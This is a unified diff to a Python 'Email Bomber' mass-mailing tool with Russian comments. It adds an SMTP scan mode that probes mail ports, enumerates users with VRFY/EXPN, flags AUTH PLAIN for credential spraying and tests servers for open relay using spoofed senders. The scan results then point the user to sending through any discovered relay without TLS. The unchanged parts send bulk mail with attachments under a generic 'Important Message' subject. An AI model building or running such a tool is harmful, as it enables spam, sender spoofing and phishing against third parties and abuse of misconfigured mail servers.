@@ -1,11 +1,12 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Феня's Email Bomber v3.0
+akuma0xdead Email Bomber v3.0
 Теперь с поддержкой keep-alive!
 """
 
 import smtplib
+import socket
 import time
 import argparse
 import sys
@@ -123,6 +124,229 @@ def _connect_refused(exc):
         return True
     msg = str(exc).lower()
     return 'connection refused' in msg or 'errno 111' in msg
+
+
+SCAN_PORTS = (25, 465, 587, 2525)
+EXTERNAL_PROBE = 'relay-probe@example.com'
+EXTERNAL_FROM = 'openrelay@example.com'
+
+
+def _smtp_ok(code):
+    return isinstance(code, int) and 200 <= code < 300
+
+
+def _port_open(host, port, timeout=5):
+    try:
+        with socket.create_connection((host, port), timeout=timeout):
+            return True
+    except OSError:
+        return False
+
+
+def _email_domain(addr):
+    return addr.split('@', 1)[1].lower() if '@' in addr else ''
+
+
+def _smtp_connect(host, port, timeout=12, starttls=False):
+    """Возвращает (smtp, error). starttls только для не-465."""
+    if port == 465:
+        smtp = smtplib.SMTP_SSL(host, port, timeout=timeout)
+        smtp.ehlo()
+        return smtp, None
+    smtp = smtplib.SMTP(host, port, timeout=timeout)
+    smtp.ehlo()
+    if starttls and smtp.has_extn('starttls'):
+        smtp.starttls()
+        smtp.ehlo()
+    return smtp, None
+
+
+def _smtp_quit(smtp):
+    if not smtp:
+        return
+    try:
+        smtp.quit()
+    except Exception:
+        try:
+            smtp.close()
+        except Exception:
+            pass
+
+
+def _try_mail_rcpt(host, port, mail_from, rcpt_to, starttls=False, timeout=12):
+    """Проверка relay до RCPT (DATA не отправляем)."""
+    smtp = None
+    try:
+        smtp, err = _smtp_connect(host, port, timeout=timeout, starttls=starttls)
+        if err:
+            return None, str(err)
+        code, resp = smtp.mail(mail_from)
+        if not _smtp_ok(code):
+            return False, f'MAIL FROM {code} {resp!r}'
+        code, resp = smtp.rcpt(rcpt_to)
+        accepted = _smtp_ok(code)
+        try:
+            smtp.rset()
+        except Exception:
+            pass
+        return accepted, f'RCPT TO {code} {resp!r}'
+    except Exception as e:
+        return None, str(e)
+    finally:
+        _smtp_quit(smtp)
+
+
+def _scan_ehlo(host, port, timeout=12):
+    smtp = None
+    try:
+        smtp, _ = _smtp_connect(host, port, timeout=timeout, starttls=False)
+        banner = (getattr(smtp, 'ehlo_resp', b'') or b'').decode(errors='replace')
+        features = dict(getattr(smtp, 'esmtp_features', {}) or {})
+        return True, banner, features
+    except Exception as e:
+        return False, str(e), {}
+    finally:
+        _smtp_quit(smtp)
+
+
+def _scan_command(host, port, command, arg, starttls=False, timeout=12):
+    smtp = None
+    try:
+        smtp, _ = _smtp_connect(host, port, timeout=timeout, starttls=starttls)
+        code, resp = smtp.docmd(command, arg)
+        return code, resp.decode(errors='replace') if isinstance(resp, bytes) else str(resp)
+    except Exception as e:
+        return None, str(e)
+    finally:
+        _smtp_quit(smtp)
+
+
+def _print_scan_line(kind, message):
+    icons = {'open': '[+]', 'info': '[~]', 'vuln': '[!]', 'safe': '[-]', 'fail': '[x]'}
+    print(f"{icons.get(kind, '[?]')} {message}")
+
+
+def run_smtp_scan(scan_target, probe_email, port_override=None, timeout=12):
+    """
+    Проверка типичных SMTP-мисконфигов: порты, EHLO, VRFY/EXPN, open-relay (plain/STARTTLS).
+    probe_email (-e) — тестовый получатель в зоне цели (например info@mkkfinpost.ru).
+    """
+    host, single_port = _parse_smtp_addr(scan_target, port_override)
+    if port_override is None and ':' not in scan_target:
+        single_port = None
+
+    domain = _email_domain(probe_email)
+    local_part = probe_email.split('@', 1)[0]
+    from_same_domain = f'scanner@{domain}' if domain else probe_email
+
+    hosts = _smtp_host_candidates(host)
+    ports_to_try = [single_port] if single_port is not None else list(SCAN_PORTS)
+
+    print(f"\n[*] SMTP scan: цель {scan_target}, probe RCPT {probe_email}")
+    if len(hosts) > 1:
+        print(f"[*] Хосты для проверки: {', '.join(hosts)}")
+
+    findings = []
+    open_endpoints = []
+
+    for try_host in hosts:
+        for port in ports_to_try:
+            label = f'{try_host}:{port}'
+            if not _port_open(try_host, port, timeout=min(timeout, 6)):
+                _print_scan_line('fail', f'{label} — порт закрыт / нет ответа')
+                continue
+            open_endpoints.append((try_host, port))
+            _print_scan_line('open', f'{label} — порт открыт')
+
+            ok, banner, features = _scan_ehlo(try_host, port, timeout=timeout)
+            if not ok:
+                _print_scan_line('fail', f'{label} EHLO: {banner}')
+                continue
+            _print_scan_line('info', f'{label} banner/caps: {banner[:120]}...' if len(banner) > 120 else f'{label} EHLO ok')
+            if 'starttls' in features:
+                _print_scan_line('info', f'{label} STARTTLS advertised')
+            auth = features.get('auth', '')
+            if auth:
+                _print_scan_line('info', f'{label} AUTH {auth.upper()}')
+                if port in (25, 587) and 'PLAIN' in auth.upper():
+                    findings.append(f'{label}: AUTH PLAIN на порту {port} (проверь cleartext / cred spray)')
+
+    if not open_endpoints:
+        print('\n[x] Нет открытых SMTP-портов на указанных хостах.')
+        return 1
+
+    # Детальные тесты на первом хосте с открытым :25, иначе первый открытый endpoint
+    test_host, test_port = next(((h, p) for h, p in open_endpoints if p == 25), open_endpoints[0])
+    _print_scan_line('info', f'Углублённые тесты на {test_host}:{test_port}')
+
+    for cmd, arg in (('VRFY', local_part), ('EXPN', local_part), ('VRFY', 'postmaster')):
+        code, resp = _scan_command(test_host, test_port, cmd, arg, timeout=timeout)
+        if code is None:
+            _print_scan_line('fail', f'{cmd} {arg}: {resp}')
+        elif _smtp_ok(code):
+            _print_scan_line('vuln', f'{cmd} {arg} -> {code} {resp} (user enum / legacy)')
+            findings.append(f'{test_host}:{test_port} {cmd} {arg} отвечает {code}')
+        elif code in (502, 504):
+            _print_scan_line('safe', f'{cmd} {arg} отключён ({code})')
+        else:
+            _print_scan_line('info', f'{cmd} {arg} -> {code} {resp}')
+
+    relay_cases = [
+        ('Open relay (plain): внешний FROM -> локальный RCPT',
+         EXTERNAL_FROM, probe_email, test_port, False),
+        ('Open relay (plain): локальный FROM -> внешний RCPT',
+         from_same_domain, EXTERNAL_PROBE, test_port, False),
+        ('Open relay (plain): произвольный From@foreign -> локальный RCPT',
+         'theskill19@yandex.ru', probe_email, test_port, False),
+        ('Open relay (plain): null sender <> -> локальный RCPT',
+         '', probe_email, test_port, False),
+    ]
+    if test_port != 465:
+        relay_cases.append(
+            ('Open relay (STARTTLS): внешний FROM -> локальный RCPT',
+             EXTERNAL_FROM, probe_email, test_port, True))
+
+    for title, mail_from, rcpt_to, port, use_tls in relay_cases:
+        sender = mail_from if mail_from else '<>'
+        accepted, detail = _try_mail_rcpt(
+            test_host, port, mail_from, rcpt_to, starttls=use_tls, timeout=timeout,
+        )
+        if accepted is None:
+            _print_scan_line('fail', f'{title}: {detail}')
+        elif accepted:
+            _print_scan_line('vuln', f'{title}: MAIL {sender} -> {rcpt_to} принят ({detail})')
+            findings.append(f'{test_host}:{port} {title}')
+        else:
+            _print_scan_line('safe', f'{title}: отклонено ({detail})')
+
+    # Дополнительно 587 submission, если открыт
+    for h, p in open_endpoints:
+        if p != 587:
+            continue
+        for title, mail_from, rcpt_to, use_tls in [
+            ('587 plain без auth', EXTERNAL_FROM, probe_email, False),
+            ('587 STARTTLS без auth', EXTERNAL_FROM, probe_email, True),
+        ]:
+            accepted, detail = _try_mail_rcpt(h, p, mail_from, rcpt_to, starttls=use_tls, timeout=timeout)
+            if accepted is None:
+                _print_scan_line('fail', f'{h}:{p} {title}: {detail}')
+            elif accepted:
+                _print_scan_line('vuln', f'{h}:{p} {title}: relay ({detail})')
+                findings.append(f'{h}:{p} {title}')
+            else:
+                _print_scan_line('safe', f'{h}:{p} {title}: отклонено')
+
+    print('\n╔══════════════════════════════════════╗')
+    print('║           ИТОГИ SMTP SCAN            ║')
+    print('╚══════════════════════════════════════╝')
+    if findings:
+        print(f'[!] Найдено потенциально уязвимых сценариев: {len(findings)}')
+        for i, item in enumerate(findings, 1):
+            print(f'    {i}. {item}')
+        print('\n[~] Для рассылки используй -s <host>:25 без STARTTLS (см. --help).')
+        return 0
+    print('[-] Явных open-relay / VRFY-сценариев не найдено (или всё закрыто политикой).')
+    return 0
 
 
 class EmailBomber:
@@ -295,15 +519,18 @@ def load_html_template(template_path):
 def main():
     print("""
     ╔══════════════════════════════════════╗
-    ║     Феня's Email Bomber v3.0         ║
+    ║     akuma0xdead Email Bomber v3.0    ║
     ║   "Keep-alive like a hacker boss!"   ║
     ╚══════════════════════════════════════╝
     """)
     
-    parser = argparse.ArgumentParser(description="Массовая рассылка писем с keep-alive")
-    parser.add_argument('-e', '--emails', required=True, help="Файл с email адресами")
-    parser.add_argument('-d', '--delay', type=int, required=True, help="Задержка между отправками (секунды)")
-    parser.add_argument('-s', '--smtp-server', required=True, help="SMTP сервер (host или host:port, напр. exchange.local:465)")
+    parser = argparse.ArgumentParser(description="Массовая рассылка писем с keep-alive / SMTP scan")
+    parser.add_argument('--scan', metavar='HOST', default=None,
+                        help="Режим скана: host или host:port (порты 25/465/587/2525 если порт не указан)")
+    parser.add_argument('-e', '--emails', default=None,
+                        help="Файл с email (рассылка) или probe RCPT при --scan (info@domain)")
+    parser.add_argument('-d', '--delay', type=int, default=None, help="Задержка между отправками (секунды)")
+    parser.add_argument('-s', '--smtp-server', default=None, help="SMTP сервер (host или host:port, напр. exchange.local:465)")
     parser.add_argument('--port', type=int, default=None, help="Порт SMTP (если не указан в -s). 465=SSL, 587=STARTTLS, 25=plain")
     tls_group = parser.add_mutually_exclusive_group()
     tls_group.add_argument('--starttls', action='store_true', help="Принудительно STARTTLS (на :25 если сервер требует TLS)")
@@ -311,14 +538,38 @@ def main():
                            help="Без STARTTLS: open-relay на :25 как swaks без --tls (минуя AUTH/TLS)")
     parser.add_argument('-u', '--user', default='', help="SMTP логин (опусти для relay без auth)")
     parser.add_argument('-p', '--password', default='', help="SMTP пароль")
-    parser.add_argument('-f', '--mail-from', required=True, help="Email отправителя")
-    parser.add_argument('-t', '--template', required=True, help="HTML файл с шаблоном письма")
+    parser.add_argument('-f', '--mail-from', default=None, help="Email отправителя")
+    parser.add_argument('-t', '--template', default=None, help="HTML файл с шаблоном письма")
     parser.add_argument('--subject', default="Important Message", help="Тема письма")
     parser.add_argument('-a', '--attach', action='append', dest='attachments', default=[],
                         help="Файл для вложения (.doc, .pdf, .zip и т.д.). Можно указать несколько раз: -a file.doc -a doc2.pdf")
     
     args = parser.parse_args()
-    
+
+    if args.scan:
+        if not args.emails or '@' not in args.emails or Path(args.emails).exists():
+            if args.emails and Path(args.emails).exists():
+                print("[!] При --scan укажи -e как один probe email (info@domain), не файл")
+            else:
+                print("[!] При --scan нужен -e info@domain — тестовый получатель в зоне цели")
+            sys.exit(1)
+        sys.exit(run_smtp_scan(args.scan, args.emails.strip(), args.port))
+
+    missing = []
+    if not args.emails:
+        missing.append('-e')
+    if args.delay is None:
+        missing.append('-d')
+    if not args.smtp_server:
+        missing.append('-s')
+    if not args.mail_from:
+        missing.append('-f')
+    if not args.template:
+        missing.append('-t')
+    if missing:
+        print(f"[!] Для рассылки укажи: {', '.join(missing)}")
+        sys.exit(1)
+
     # Проверяем файлы
     if not Path(args.emails).exists():
         print(f"[!] Файл с email'ами не найден: {args.emails}")
@@ -391,7 +642,7 @@ def main():
     print(f"""
     ╔═══════════════════════════════════════╗
     ║           ИТОГИ РАССЫЛКИ              ║
-    ║  Отправлено успешно: {sent_count:<15} ║
+    ║  Отправлено успешно: {sent_count:<15}  ║
     ║  Ошибок отправки: {failed_count:<18}  ║
     ║  "Keep-alive for the win, чувак!"     ║
     ╚═══════════════════════════════════════╝
